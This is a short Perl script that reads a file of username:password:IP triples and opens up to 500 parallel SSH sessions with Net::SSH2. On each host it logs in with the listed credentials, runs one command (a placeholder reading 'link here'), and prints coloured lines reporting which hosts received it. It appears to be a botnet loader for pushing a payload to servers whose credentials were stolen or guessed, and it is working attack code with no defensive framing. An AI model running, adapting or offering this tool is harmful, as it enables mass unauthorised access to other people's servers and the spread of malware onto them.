#!/usr/bin/perl
#format user:pass:ip
#usage perl script.pl list
 
use Net::SSH2; use Parallel::ForkManager;
 
$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);
 
}
my $pm = new Parallel::ForkManager(500); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('link here');
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mCommand sent to: ".$newarray[$c]."\n";
                } else {
                        print "\e[0;34mCan't Authenticate Host: ".$newarray[$c]."\n";
                }
        } else {
                print "\e[1;31;1mCant Connect To Host: ".$newarray[$c]."\n";
        }
        $pm->finish;
}
$pm->wait_all_children;